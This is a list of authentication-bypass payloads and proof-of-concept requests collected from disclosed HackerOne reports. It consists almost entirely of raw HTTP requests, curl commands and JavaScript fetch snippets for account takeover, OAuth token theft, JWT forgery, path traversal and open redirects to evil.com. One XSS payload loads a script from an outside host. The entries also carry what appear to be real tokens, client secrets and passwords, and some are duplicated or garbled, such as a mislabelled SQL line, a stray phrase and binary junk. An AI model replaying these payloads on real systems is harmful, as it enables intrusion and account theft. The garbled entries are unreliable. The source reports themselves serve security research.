# Authentication Bypass  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#1040786](https://hackerone.com/reports/1040786)  -  Exposure of a valid Gitlab-Workhorse JWT leading to various bad things
*high*

```http
POST /api/v4/projects/<project-id>/terraform/state/%2e%2e%2f%2e%2e%2fwikis%2fattachments?serial=1 HTTP/1.1
Host: gitlab3.example.vm
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTdc8IV2vpQMwv6jW
Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzBOVE14T1RWbUxXRTBZalF0TkRBek1pM…
Content-Length: 316

------WebKitFormBoundaryTdc8IV2vpQMwv6jW
Content-Disposition: form-data; name="import_url"

http://gitlab3.example.vm/test/ttt
------WebKitFormBoundaryTdc8IV2vpQMwv6jW
Content-Disposition: form-data; name="mirror"; filename=test.txt
Content-Type: image/jpg

true
------WebKitFormBoundaryTdc8IV2vpQMwv6jW--
```

## 2. [#1040786](https://hackerone.com/reports/1040786)  -  Exposure of a valid Gitlab-Workhorse JWT leading to various bad things
*high*

```http
POST /api/v4/projects/<project-id>/terraform/state/%2e%2e%2f%2e%2e%2fwikis%2fattachments?serial=1 HTTP/1.1
Host: gitlab3.example.vm
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTdc8IV2vpQMwv6jW
Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzBOVE14T1RWbUxXRTBZalF0TkRBek1pM…
Content-Length: 316

------WebKitFormBoundaryTdc8IV2vpQMwv6jW
```

## 3. [#1148364](https://hackerone.com/reports/1148364)  -  Mint Oauth2 access token for targeted user
*high, $5,580*

```http
POST /login/oauth/access_token HTTP/1.1
Host: gdk.test:3000
Cookie: perf_bar_enabled=true; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkltTTBaR0ZsWW…
Content-Length: 223

code=6c53ef532f34762b8705029d4fd005d2c32d788d3e3a78151c1b5f6a2743dffc&client_id=04a5da53b6faaba4758fcb0e7bd80845795c9c838363568c9b4efcc0bcec1934&client_secret=9de25469a82dee694ae4e33e02a3e97156bec87ba905fc4e3e34b9de805f9dc4
```

## 4. [#776684](https://hackerone.com/reports/776684)  -  [h1-415 2020] My writeup on how to retrieve the special secret document
*critical*

```http
POST /support/review/85c8e222848012b567fed595a6bdcb3b57ce6bce4716d132e8361536fcc29031 HTTP/1.1
Cookie: _csrf_token=312edf8cc51423f130df5a09c958c4855eff90c7; session=.eJwli8sOgjAQRb_FWRPSp5au-Ah3x…

name=<script src="http://blakl.is/pwn.js"/>&user_id=16&_csrf_token=312edf8cc51423f130df5a09c958c4855eff90c7
```

## 5. [#1040786](https://hackerone.com/reports/1040786)  -  Exposure of a valid Gitlab-Workhorse JWT leading to various bad things
*high*

```http
GET /api/v4/projects/6/terraform/state/%2e%2e%2f%2e HTTP/1.1
Host: gitlab3.example.vm
Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzBOVE14T1RWbUxXRTBZalF0TkRBek1pM…
```

## 6. [#1040786](https://hackerone.com/reports/1040786)  -  Exposure of a valid Gitlab-Workhorse JWT leading to various bad things
*high*

```http
GET /api/v4/projects/6/terraform/state/%2e%2e%2f%2e HTTP/1.1
Host: gitlab3.example.vm
Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzBOVE14T1RWbUxXRTBZalF0TkRBek1pM…

'''
```

## 7. [#1544236](https://hackerone.com/reports/1544236)  -  returnUrl= allow attacker to redirect users to the another phising website and takeover credientials
*medium*

```http
POST /User/AuthenticateForms HTTP/1.1
Host: login.insightly.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Origin: https://login.insightly.com
Referer: https://login.insightly.com/User/Login?ReturnUrl=%2f
Cookie: █████

__RequestVerificationToken=4BVQV2MAdvcy2OyK6O0n3y42YRSJDDLcxesTFOeBBnwMLe1tiW_wCpMUoVZOop4wu1SxC95l_rcYoEGGWnzriUmmZJE1&email=ilovebugbounty%40gmail.com&password=AMRIT007qwerty%23&ReturnUrl=%2F&AppId=
```

## 8. [#1040786](https://hackerone.com/reports/1040786)  -  Exposure of a valid Gitlab-Workhorse JWT leading to various bad things
*high*

```http
POST /-/push_from_secondary/2/rrr/dsds.git/git-upload-pack.t%2f%2e%2e%2fgit-receive-pack HTTP/1.1
Host: gitlab3.example.vm
Content-Type: application/x-git-receive-pack-request
Content-Length: 436

00a822cc76ea883341147a10ad83f9994bb9a89d79d9 02c1e26f4d449d265e87e2906933ff0a2a5f275d refs/heads/master report-status side-band-64k object-format=sha1 agent=git/2.28.00000PACKxËA
B!Ð½§póõ;Dtö-gt¢ óc
uûºBÛotU[" q(IYÐ«EsE¨dÌ(´*Ù¸ësØeÉ£rJÞKòW"
"Ä
R!ÃsÜZ·6»=sU{ø´yÒ7×í¡ûÜêÑBtÑ!ø°ÚCçÌOë}ý³¡¯a¾kå=ÕúsVOæme²6
Az^×ÿÜTx*Õÿ»Ó lll2332.txt¨'FÛN^ÁÎZÐpå}Í"¶Ü¿³ÐÌHt!4x+))á"gøÈÎ.LG^gßygßÿæ5,
```

## 9. [#1040786](https://hackerone.com/reports/1040786)  -  Exposure of a valid Gitlab-Workhorse JWT leading to various bad things
*high*

```http
POST /-/push_from_secondary/2/rrr/dsds.git/git-upload-pack.t%2f%2e%2e%2fgit-receive-pack HTTP/1.1
Host: gitlab3.example.vm
Content-Type: application/x-git-receive-pack-request
Content-Length: 436

00a822cc76ea883341147a10ad83f9994bb9a89d79d9 02c1e26f4d449d265e87e2906933ff0a2a5f275d refs/heads/master report-status side-band-64k object-format=sha1 agent=git/2.28.00000PACKxËA
```

## 10. [#903363](https://hackerone.com/reports/903363)  -  No Rate Limiting On Phone Number Login Leads to Login Bypass
*medium*

```http
POST /user/json/phone_login HTTP/1.1
Host: web.smule.com
Referer: https://web.smule.com/s/explore
Content-Type: application/x-www-form-urlencoded
X-CSRF-Token: 2ag62pPLPByBn5MIAKIJY6SJF4jhBXaO4rFkk1HquzA=
Content-Length: 93
Cookie: connection_info=eyJjb3VudHJ5IjoiUEsiLCJob21lUG9wIjoiYXNoIn0%3D--190203865a084a1be6f7ec4f9d94…

pin_id=5159d8bd-8b96-469e-960f-4b88fc779ae0&pin_code=5062&tz_offset=18000&entered_birth_date=
```

## 11. [#405100](https://hackerone.com/reports/405100)  -  Stealing Users OAUTH Tokens via redirect_uri
*medium*

```http
GET /api/auth?response_type=code&redirect_uri=http%3A%2F%2Fxbox.dayz.comtest.com%2Fapi%2Fauth%2Fcallback&state=OCoU2LvhmzLGAZ03DWem5QNs&client_id=%24edd1bfdc470df4b8d7b81c2683fc6d3 HTTP/1.1
Host: accounts.bistudio.com
Referer: https://incubator.bohemia.net/
Cookie: cookieconsent_dismissed=yes; bi.accounts.connect.sid=s%3AEbOE7LAPYR9IJO8ocyKuhNoIx_qXNt7_.UW…
```

## 12. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```http
GET /statements?month=11&year=2019 HTTP/1.1
Host: app.bountypay.h1ctf.com
X-Requested-With: XMLHttpRequest
Referer: https://app.bountypay.h1ctf.com/
Cookie: token=<@base64_1>{"account_id":"../../../redirect?url=https://software.bountypay.h1ctf.com/#…
```

## 13. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```http
GET /statements?month=11&year=2019 HTTP/1.1
Host: app.bountypay.h1ctf.com
X-Requested-With: XMLHttpRequest
Referer: https://app.bountypay.h1ctf.com/
Cookie: token=<@base64_1>{"account_id":"../../../redirect?url=https://software.bountypay.h1ctf.com/§…
```

## 14. [#1544236](https://hackerone.com/reports/1544236)  -  returnUrl= allow attacker to redirect users to the another phising website and takeover credientials
*medium*

```http
GET /User/FrontDoorLogin/?token=YrkOz7vdHHA9AH7B%2fY5jUdIP1%2bchPdePfn0Zm7uCtVQui0tHHMW24B14WwsYP5%2bKpa3Xz7%2f5r5muQa3EB%2bQEwtPlJ8XbvozoLZFfhD75Sm3tKLhdgfWWHYq8abV2%2bpOtifD1I5N2uomDBXvMQ8tjFREb39XDuUcrObQMUsqboMZY9dojVqORmIYwb4VPyoSBaYOF4%2bYOX3GTYj8t1ArOA0xeH4oorz6flU6FLrfTLdtG6u%2fC7vZ9CfvsfH3F%2bBye&returnUrl=https://evil.com HTTP/1.1
Host: crm.na1.insightly.com
Referer: https://login.insightly.com/
Cookie: ███████
```

## 15. [#922456](https://hackerone.com/reports/922456)  -  Ability to bypass email verification for OAuth grants results in accounts takeovers on 3rd parties
*high, $3,000*

```http
POST /oauth/authorize HTTP/1.1
Host: gitlab.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 354
Cookie: [COOKIES]

utf8=%E2%9C%93&authenticity_token=[CSRF TOKEN]&client_id=6dd35c52b02a99eca3454505c4b1f1fa761ad1125bcdccdbc1c290877ef25093&redirect_uri=https%3A%2F%2Flaravelshift.com%2Fauth%2Fgitlab%2Fcallback&state=[STATE VALUE FROM URL]&response_type=code&scope=&nonce=
```

## 16. [#3734676](https://hackerone.com/reports/3734676)  -  Taskcluster web-server OAuth2 authorization codes are reusable and the exchange handler checks the wrong expiry column
*medium, $2,000*

```http
DELETE FROM authorization_codes
```

## 17. [#1544236](https://hackerone.com/reports/1544236)  -  returnUrl= allow attacker to redirect users to the another phising website and takeover credientials
*medium*

```http
POST /User/AuthenticateForms HTTP/1.1
Host: login.insightly.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Origin: https://login.insightly.com
Referer: https://login.insightly.com/User/Login?ReturnUrl=%2f
Cookie: █████
```

## 18. [#1539426](https://hackerone.com/reports/1539426)  -  Broken access control
*high*

```http
POST /api/Account/SendTempPassword/?userName=█████████████ HTTP/2
Host: ██████████████████
Cookie: ████████
Content-Length: 0
Origin: ██████████████████
```

## 19. [#734936](https://hackerone.com/reports/734936)  -  SSO bypass in zendesk using trint organization able to leak internal ticket information
*high*

```http
POST / HTTP/1.1
Host: graphql2.trint.com
Referer: https://app.trint.com/
content-type: application/json
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJodHRwczovL2FwcC50cmludC5jb20vdXNlcklkIjoiNWRjOTUwZWEzOGFhMjI3MmExNzAyMzFkIiwiaHR0cHM6Ly9hcHAudHJpbnQuY29tL2lzTmV3VXNlciI6dHJ1ZSwiaHR0cHM6Ly9zY2hlbWEudHJpbnQuY29tL2F1dGhqdGkiOiI0ZmMwMjUyZS03NTFiLTQwNjctOWU0MC00OGQ4MWMzMjRiMjIiLCJpc3MiOiJodHRwczovL3RyaW50LmF1dGgwLmNvbS8iLCJzdWIiOiJhdXRoMHw1ZGM5NTBlYTM4YWEyMjcyYTE3MDIzMWQiLCJhdWQiOiJ0cmludC1hcGlzIiwiaWF0IjoxNTczNDc0NTQyLCJleHAiOjE1NzYwNjY1NDIsImF6cCI6ImljaDRoeVZZUEtLZ2VFb1RoNmZXUFhjNmZydmVUY1RxIiwiZ3R5IjoicGFzc3dvcmQifQ.JyIc6PZyjidptrvaFT6MykOr0BopUi1F7fZWTvbeKeU
Origin: https://app.trint.com
Content-Length: 111

{"operationName":null,"variables":{"status":"PENDING"},"query":"query zendeskToken {\n    zendeskToken\n  }\n"}
```

## 20. [#1490470](https://hackerone.com/reports/1490470)  -  Admin Authentication Bypass Lead to Admin Account Takeover
*medium*

```http
POST /api/Account/Login/ HTTP/2
Host: ███████
Cookie: ███
Content-Type: application/json;charset=utf-8
Content-Length: 38
Origin: ████████

{"UserName":"██████","Password":"██████████"}
```

## 21. [#1490470](https://hackerone.com/reports/1490470)  -  Admin Authentication Bypass Lead to Admin Account Takeover
*medium*

```http
POST /api/Account/Login/ HTTP/2
Host: ███████
Cookie: ███
Content-Type: application/json;charset=utf-8
Content-Length: 38
Origin: ████████
```

## 22. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```http
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
Origin: https://app.bountypay.h1ctf.com
Referer: https://app.bountypay.h1ctf.com/

username=brian.oliver&password=V7h0inzX&challenge=13d6718efc0a44576c8aad1a6f193521&challenge_answer=myAnswer
```

## 23. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```http
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 87
Origin: https://app.bountypay.h1ctf.com
Referer: https://app.bountypay.h1ctf.com/

username=brian.oliver&password=V7h0inzX&challenge=<@md5_5>a<@/md5_5>&challenge_answer=a
```

## 24. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```http
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
Content-Length: 23
Content-Type: application/x-www-form-urlencoded

staff_id=STF:8FJ3KFISL3
```

## 25. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```http
POST /?template=home HTTP/1.1
Host: staff.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Origin: https://staff.bountypay.h1ctf.com
Referer: https://staff.bountypay.h1ctf.com/?template=home
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbF…

profile_name=sandra&profile_avatar=tab1%20upgradeToAdmin
```

## 26. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```http
GET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109aG9tZSZ0ZW1wbGF0ZVtdPXRpY2tldCZ0aWNrZXRfaWQ9MzU4MiZ1c2VybmFtZT1zYW5kcmEuYWxsaXNvbiN0YWIx HTTP/1.1
Host: staff.bountypay.h1ctf.com
X-Requested-With: XMLHttpRequest
Referer: https://staff.bountypay.h1ctf.com//?template[]=login&template[]=home&template[]=ticket&ticket_id=3582&username=sandra.allison
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR1B3NV…
```

## 27. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```http
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Origin: https://app.bountypay.h1ctf.com
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

## 28. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```http
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Origin: https://app.bountypay.h1ctf.com
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9

app_style=https://foo.x.0xcc.ovh/test.css
```

## 29. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```http
POST /?template=home HTTP/1.1
Host: staff.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Origin: https://staff.bountypay.h1ctf.com
Referer: https://staff.bountypay.h1ctf.com/?template=home
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbF…
```

## 30. [#3329310](https://hackerone.com/reports/3329310)  -  Improper bot-authentication allows to impersonate any user when sending messages in a room
*high, $2,000*

```http
POST /rooms/2/2-/messages HTTP/1.1
Host: localhost:8000
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 193

Hello ! I'm the test user, even though I'm not authenticated
```

## 31. [#397130](https://hackerone.com/reports/397130)  -  Unauthenticated access to Zendesk tickets through athena-flex-production.shopifycloud.com Okta bypass
*critical*

```bash
curl -i -s -k  -X $'POST' \
    -H $'Host: athena-flex-production.shopifycloud.com' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Length: 422' \
    --data-binary $'{\"query\": \"query getRecentTicketsQuery($domain: String) {\\n    shop(myshopifyDomain: $domain) {\\n      zendesk {\\n        tickets(last: 5) {\\n          edges {\\n            node {\\n              id\\n               requester {\\n                name\\n              }\\n              subject\\n              description\\n              }\\n          }\\n        }\\n      }\\n    }\\n  }\\n\",\"variables\":{\"domain\":\"ok.myshopify.com\"}}' \
    $'https://athena-flex-production.shopifycloud.com/graphql'
```

## 32. [#2536758](https://hackerone.com/reports/2536758)  -  Authentication & Registration Bypass in Newspack Extended Access
*medium*

```js
// Endpoint URL
let url = `${window.location.protocol}//${window.location.hostname}/wp-json/newspack-extended-access/v1/google/register`;
// JWT contents - this JWT contains the details above, and will not work as-is.
let token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYXpwIjoiMTIzNDUtYWJjZGVmLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwiZW1haWwiOiJ0ZXN0QGV4YW1wbGUub3JnIn0.Nq7Nc2AyWe17gPmIHVRCc4z9qKP-HBZwfWhyQ_dg9X0";
// Provide token to authentication endpoint.
fetch(  
    url,  
    {  
       cache: 'no-store',  
       method: 'POST',  
       headers: {  
          'Content-type': 'text/plain',  
       },  
       body: token  
    }  
).then(response => {  
    console.log(response.json(), 'response');  
})
```

## 33. [#2472798](https://hackerone.com/reports/2472798)  -  Authentication & Registration Bypass in Newspack Extended Access
*medium*

```
// Endpoint URL
let url = `${window.location.protocol}//${window.location.hostname}/wp-json/newspack-extended-access/v1/google/register`;
// JWT contents - this JWT contains email "test@example.org".
let token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZW1haWwiOiJ0ZXN0QGV4YW1wbGUub3JnIiwiaWF0IjoxNzEzNjY2NjQ5LCJleHAiOjE3MTM2NzAyNDl9.I8D18nWsn5H6AylwJdak8727APyiMCWkcnXH95vMF_k";
// Provide token to authentication endpoint.
fetch(  
    url,  
    {  
       cache: 'no-store',  
       method: 'POST',  
       headers: {  
          'Content-type': 'text/plain',  
       },  
       body: token  
    }  
).then(response => {  
    console.log(response.json(), 'response');  
})
```

## 34. [#921780](https://hackerone.com/reports/921780)  -  Improper Authentication - any user can login as other user with otp/logout & otp/login
*critical*

```http
POST /scauth/otp/droid/logout HTTP/1.1
Host: gcp.api.snapchat.com
Content-Length: 168
Content-Type: application/json; charset=utf-8

{"user_id":"████","device_id":"███████","device_name":"███████"}
```

## 35. [#921780](https://hackerone.com/reports/921780)  -  Improper Authentication - any user can login as other user with otp/logout & otp/login
*critical*

```http
POST /scauth/otp/login HTTP/1.1
Host: gcp.api.snapchat.com
Content-Length: 6213
Content-Type: application/x-www-form-urlencoded; charset=utf-8

application_id=com.snap.framework&attestation=████████&device_id=█████████&dsig=█████&dtoken1i=██████&fidelius_client_init=███████&height=1920&max_video_height=1920&max_video_width=1080&password=███████&reactivation_confirmed=false&req_token=████████&screen_height_in=4.527565&screen_height_px=1920&screen_width_in=2.5590599&screen_width_px=1080&timestamp=1594604398438&token=████&username=█████&width=1080
```

## 36. [#921780](https://hackerone.com/reports/921780)  -  Improper Authentication - any user can login as other user with otp/logout & otp/login
*critical*

```http
POST /scauth/otp/droid/logout HTTP/1.1
Host: gcp.api.snapchat.com
Content-Length: 168
```

## 37. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```http
GET /statements?month=01&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
X-Requested-With: XMLHttpRequest
Referer: https://app.bountypay.h1ctf.com/
Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9
```

## 38. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```http
GET /statements?month=01&year=2019 HTTP/1.1
Host: app.bountypay.h1ctf.com
X-Requested-With: XMLHttpRequest
Referer: https://app.bountypay.h1ctf.com/
Cookie: token=<@base64_1>{"account_id":"F8gHiqSdpK#","hash":"de235bffd23df6995ad4e0930baac1a2"}<@/base64_1>
```

## 39. [#1580493](https://hackerone.com/reports/1580493)  -  Bypass validation parts in AWS IAM Authenticator for Kubernetes
*high, $2,500*

```http
POST /authenticate HTTP/1.1
Host: 127.0.0.1:21362
Content-Length: 563

{"Spec":{"Token":"<token-value>"}}
```

## 40. [#748214](https://hackerone.com/reports/748214)  -  [express-laravel-passport] Improper Authentication
*high*

```bash
curl -H "authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjF9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc" localhost:3000
```

## 41. [#748214](https://hackerone.com/reports/748214)  -  [express-laravel-passport] Improper Authentication
*high*

```bash
curl -H "authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjJ9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc" localhost:3000
```

## 42. [#838572](https://hackerone.com/reports/838572)  -  No Rate Limit On Reset Password
*medium*

```http
POST /dbconnections/change_password HTTP/1.1
Host: login.every.org
Content-Type: application/json
Content-Length: 130
Origin: https://every.org
Referer: https://every.org/resetPassword

{"client_id":"1bT892TGga38o0GFw5EusmGnV9b3kjCq","email":"YOUREMAILADDRESS@gmail.com","connection":"Username-Password-Authentication"}
```

## 43. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```jsx
$('.upgradeToAdmin').click(function () {
  let t = $('input[name="username"]').val();
  $.get('/admin/upgrade?username=' + t, function () {
    alert('User Upgraded to Admin')
  })
}),
$('.tab').click(function () {
  return $('.tab').removeClass('active'),
  $(this).addClass('active'),
  $('div.content').addClass('hidden'),
  $('div.content-' + $(this).attr('data-target')).removeClass('hidden'),
  !1
}),
$('.sendReport').click(function () {
  $.get('/admin/report?url=' + url, function () {
    alert('Report sent to admin team')
  }),
  $('#myModal').modal('hide')
}),
document.location.hash.length > 0 && ('#tab1' === document.location.hash && $('.tab1').trigger('click'), '#tab2' === document.location.hash && $('.tab2').trigger('click'), '#tab3' === document.location.hash && $('.tab3').trigger('click'), '#tab4' === document.location.hash && $('.tab4').trigger('click'));
```

## 44. [#1342088](https://hackerone.com/reports/1342088)  -  Flickr Account Takeover using AWS Cognito API
*critical*

```http
POST / HTTP/2
Host: cognito-idp.us-east-1.amazonaws.com

{
    "AuthFlow":"USER_PASSWORD_AUTH",
    "ClientId":"3ck15a1ov4f0d3o97vs3tbjb52",
    "AuthParameters":{
        "USERNAME":"flickr-attacker@lauritz-holtmann.de",
        "PASSWORD":"[REDACTED]",
        "DEVICE_KEY":"us-east-1_07032954-25bf-4781-b596-9d675d901072"
    },
    "ClientMetadata":
    {                
    }
}
```

## 45. [#1342088](https://hackerone.com/reports/1342088)  -  Flickr Account Takeover using AWS Cognito API
*critical*

```http
POST / HTTP/2
Host: cognito-idp.us-east-1.amazonaws.com
```

## 46. [#1709881](https://hackerone.com/reports/1709881)  -  Authentication Bypass Leads To  Complete Account TakeveOver on ██████████
*critical*

```http
POST /app/login HTTP/1.1
Host: mtnmobad.mtnbusiness.com.ng
Cookie: █████
```

## 47. [#776684](https://hackerone.com/reports/776684)  -  [h1-415 2020] My writeup on how to retrieve the special secret document
*critical*

```http
POST /support/review/85c8e222848012b567fed595a6bdcb3b57ce6bce4716d132e8361536fcc29031 HTTP/1.1
```

## 48. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```bash
$ for line in $(cat bp_web_trace.log) ; do echo $line|cut -d: -f2|base64 -d ; echo ;done
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```

## 49. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 01 Jun 2020 16:51:59 GMT
Content-Type: application/json
Connection: close
Content-Length: 1609

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/#\/statements?month=11&year=2019",
"data":"<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Software Storage<\/title>\n    <link href=\"\/css\/bootstrap.min.css\" rel=\"stylesheet\">\n<\/head>\n<body>\n\n<div class=\"container\">\n    <div class=\"row\">\n        <div class=\"col-sm-6 col-sm-offset-3\">\n            <h1 style=\"text-align: center\">Software Storage<\/h1>\n            <form method=\"post\" action=\"\/\">\n                <div class=\"panel panel-default\" style=\"margin-top:50px\">\n                    <div class=\"panel-heading\">Login<\/div>\n                    <div class=\"panel-body\">\n                        <div style=\"margin-top:7px\"><label>Username:<\/label><\/div>\n                        <div><input name=\"username\" class=\"form-control\"><\/div>\n                        <div style=\"margin-top:7px\"><label>Password:<\/label><\/div>\n                        <div><input name=\"password\" type=\"password\" class=\"form-control\"><\/div>\n                    <\/div>\n                <\/div>\n                <input type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\">\n            <\/form>\n        <\/div>\n    <\/div>\n<\/div>\n<script src=\"\/js\/jquery.min.js\"><\/script>\n<script src=\"\/js\/bootstrap.min.js\"><\/script>\n<\/body>\n<\/html>"}
# … truncated …
```

## 50. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```http
GET /api/accounts/F8gHiqSdpK/ HTTP/1.1
Host: api.bountypay.h1ctf.com
```

## 51. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```
../../../redirect?url=https://software.bountypay.h1ctf.com/#
```

## 52. [#890196](https://hackerone.com/reports/890196)  -  [H1-2006 2020]  Multiple vulnerabilities lead to CEO account takeover and paid bounties
*critical*

```
../../../redirect?url=https://software.bountypay.h1ctf.com/§§#
```

## 53. [#55140](https://hackerone.com/reports/55140)  -  Race Conditions in OAuth 2 API implementations
*medium*

```http
GET /api/me?access_token=ACCESS_TOKEN_VALUE HTTP/1.1
Host: OAUTH_PROVIDER_DOMAIN
```

## 54. [#55140](https://hackerone.com/reports/55140)  -  Race Conditions in OAuth 2 API implementations
*medium*

```http
Put it simply
```

## 55. [#3744543](https://hackerone.com/reports/3744543)  -  CVE-2026-8927: env-set cross-proxy Digest auth state leak
*medium*

```http
GET http://example.test/protected HTTP/1.1
Host: example.test
```

## 56. [#748214](https://hackerone.com/reports/748214)  -  [express-laravel-passport] Improper Authentication
*high*

```javascript
const express = require('express')
const Sequelize = require('sequelize')
const passport = require('express-laravel-passport')

// create inmemory Sqlite DB for testing purposes
const sequelize = new Sequelize('database', 'username', 'password', {dialect: 'sqlite'})

// init express
const app = express()
const port = 3000

// create instance of `express-laravel-passport`
const passportMiddleware = passport(sequelize)

